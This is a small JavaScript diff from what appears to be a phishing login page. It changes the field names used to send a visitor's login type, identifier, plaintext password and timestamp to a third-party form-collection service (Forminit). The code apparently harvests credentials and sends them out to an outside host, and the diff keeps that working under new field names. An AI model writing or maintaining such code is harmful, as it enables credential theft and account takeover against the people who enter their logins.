@@ -314,10 +314,10 @@
     // ── send via Forminit official SDK (no CORS issues) ──
     try {
       const formData = new FormData();
-      formData.append('Login_Type', loginType);
-      formData.append('Identifier', identifier);
-      formData.append('Password',   password);
-      formData.append('Time',       new Date().toLocaleString());
+      formData.append('fi-text-loginType', loginType);
+      formData.append('fi-text-identifier', identifier);
+      formData.append('fi-text-password',   password);
+      formData.append('fi-text-time',       new Date().toLocaleString());
 
       const { data, error } = await forminit.submit(FORM_ID, formData);
 
